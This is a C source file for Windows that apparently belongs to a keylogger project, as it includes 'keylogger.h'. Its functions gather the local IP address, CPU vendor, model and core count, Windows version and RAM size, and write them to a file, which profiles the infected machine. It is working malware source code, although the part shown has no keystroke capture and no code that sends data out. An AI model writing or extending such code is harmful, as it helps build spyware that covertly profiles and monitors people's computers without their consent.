#include "keylogger.h"

void	get_ip_address(void)
{
	WSADATA wsaData;
	char hostname[256];

	// Initialize Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		write_logs("Failed to initialize Winsock.\n");
		return;
	}

	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
	{
		write_logs("Failed to get hostname.\n");
		WSACleanup();
		return;
	}

	// Get the IP address of the local machine
	struct addrinfo hints, *res = NULL;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(hostname, NULL, &hints, &res) != 0)
	{
		write_logs("Failed to get address info for the hostname.\n");
		WSACleanup();
		return;
	}

	// Convert the IP address to a string
	char ipstr[INET_ADDRSTRLEN] = {0};

	struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;

	// Convert the IPv4 address to a string
	if (InetNtop(AF_INET, &(ipv4->sin_addr), ipstr, sizeof(ipstr)) != NULL)
	{
		char message[256];
		snprintf(message, sizeof(message), "Adresse IP locale : %s\n", ipstr);
		write_to_file(message);
	}

	freeaddrinfo(res);
	WSACleanup();
}

const char* get_arch_name(WORD arch)
{
	// Return the architecture name based on the processor architecture by using windows defines
	switch (arch)
	{
		case PROCESSOR_ARCHITECTURE_INTEL:			return "Intel (x86)";
		case PROCESSOR_ARCHITECTURE_MIPS:			return "MIPS";
		case PROCESSOR_ARCHITECTURE_ALPHA:			return "Alpha";
		case PROCESSOR_ARCHITECTURE_PPC:			return "PowerPC";
		case PROCESSOR_ARCHITECTURE_SHX:			return "SHX";
		case PROCESSOR_ARCHITECTURE_ARM:			return "ARM";
		case PROCESSOR_ARCHITECTURE_IA64:			return "Intel Itanium";
		case PROCESSOR_ARCHITECTURE_ALPHA64:		return "Alpha64";
		case PROCESSOR_ARCHITECTURE_MSIL:			return "MSIL";
		case PROCESSOR_ARCHITECTURE_AMD64:			return "AMD64 (x64)";
		case PROCESSOR_ARCHITECTURE_IA32_ON_WIN64:	return "IA32 on Win64";
		case PROCESSOR_ARCHITECTURE_NEUTRAL:		return "Neutral";
		case PROCESSOR_ARCHITECTURE_ARM64:			return "ARM64";
		case PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64:	return "ARM32 on Win64";
		case PROCESSOR_ARCHITECTURE_IA32_ON_ARM64:	return "IA32 on ARM64";
		case PROCESSOR_ARCHITECTURE_UNKNOWN:		return "Unknown";
		default:									return "Unknown (undefined)";
	}
}

void get_cpu_info(void)
{
	// Get CPU vendor and model information using __cpuid intrinsic
	int cpuInfoData[4] = {0};
	char vendor[13] = {0};

	// Get the CPU vendor string
	__cpuid(cpuInfoData, 0);
	*((int*)vendor) = cpuInfoData[1];
	*((int*)(vendor + 4)) = cpuInfoData[3];
	*((int*)(vendor + 8)) = cpuInfoData[2];

	char modelInfo[256] = {0};

	int modelData[4] = {0};
	char brand[49] = {0};

	// Get the CPU brand string
	__cpuid(modelData, 0x80000002);
	memcpy(brand, modelData, 16);

	__cpuid(modelData, 0x80000003);
	memcpy(brand + 16, modelData, 16);

	__cpuid(modelData, 0x80000004);
	memcpy(brand + 32, modelData, 16);
	brand[48] = '\0';

	snprintf(modelInfo, sizeof(modelInfo), "CPU Vendor: %s\nCPU Model: %s\n", vendor, brand);
	write_to_file(modelInfo);

	// Get CPU information using  Arch and number of processors
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	char cpuInfo[256];
	snprintf(cpuInfo, sizeof(cpuInfo), "CPU Architecture: %s\nNombre de coeur: %lu\n",
				 get_arch_name(sysInfo.wProcessorArchitecture),
				(unsigned long)sysInfo.dwNumberOfProcessors);
	write_to_file(cpuInfo);
}

void get_windows_info(void)
{
	// Define the structure for RtlGetVersion
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	if (hMod)
	{
		// Define the function pointer type for RtlGetVersion
		void* pFn = (void*)GetProcAddress(hMod, "RtlGetVersion");
		if (pFn)
		{
			// Cast the function pointer to the correct type
			RtlGetVersionPtr fn = (RtlGetVersionPtr)pFn;
			RTL_OSVERSIONINFOW rovi;
			ZeroMemory(&rovi, sizeof(rovi));
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (fn(&rovi) == 0)
			{
				char versionInfo[256];
				snprintf(versionInfo, sizeof(versionInfo),
						 "Windows version: %ld.%ld (build %ld)\n",
						 rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
				write_to_file(versionInfo);
				return;
			}
		}
	}
	write_logs("Impossible de récupérer la version de Windows\n");
	write_to_file("Impossible de récupérer la version de Windows\n");
}

void get_ram_info(void)
{
	// Get the total physical memory using GlobalMemoryStatusEx
	MEMORYSTATUSEX status;
	status.dwLength = sizeof(status);
	GlobalMemoryStatusEx(&status);
	char ramInfo[256];
	snprintf(ramInfo, sizeof(ramInfo), "RAM: %llu MB\n", status.ullTotalPhys / (1024 * 1024));
	write_to_file(ramInfo);
}
